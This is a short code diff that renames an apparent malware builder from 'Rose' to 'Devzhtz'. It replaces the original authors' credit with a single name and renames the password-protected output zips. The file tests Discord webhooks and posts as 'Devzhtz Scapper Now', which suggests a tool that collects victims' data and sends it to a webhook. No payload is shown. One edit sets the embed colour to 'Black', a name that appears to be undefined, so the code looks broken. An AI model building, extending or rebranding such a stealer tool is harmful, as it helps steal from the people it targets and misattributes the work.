@@ -97,7 +97,7 @@ links = {
     "Devzhtz_Discord": "https://discord.gg/VsmErgaTcv"
 }
 
-logger.critical(f"Rose UI Builder is using version {str(__version__)}")
+logger.critical(f"Devzhtz UI Builder is using version {str(__version__)}")
 
 def open_link(key):
     webbrowser.open(links[key])
@@ -130,11 +130,11 @@ async def test_webhook(webhook_url):
         async with Webhook.Async(webhook_url) as hook:
             embed = Embed(
                 description='Webhook esta funcionando',
-                color=11795068,
+                color=Black,
                 timestamp="now"
             )
             embed.set_author(name="Sucesso", icon_url=__icon__)
-            embed.set_footer(text="Devzhtz Builder | By pierro, suegdu, gumbobr0t, svn, Minecraft_killer", icon_url=__icon__)
+            embed.set_footer(text="Devzhtz Builder | BY devzhtz", icon_url=__icon__)
             await hook.send(embed=embed, username='Devzhtz Scapper Now', avatar_url='https://cdn.discordapp.com/attachments/1155214110364008548/1155214244837597194/Premium_Vector___Red_devil_logo_vector_icon_template.jpg')
         return 0
     except Exception as e:
@@ -147,7 +147,7 @@ characters = string.ascii_letters + string.digits
 
 gen = ''.join(random.choice(characters) for _ in range(10))
 zip_passw = 'devzhtz'
-zip_name = f'Rose-Final-{gen}.zip'
+zip_name = f'devzhtz-Final-{gen}.zip'
 
 def _makebuild(q: Queue, data_builder) -> str:
     logger.info("Entered _makebuild")
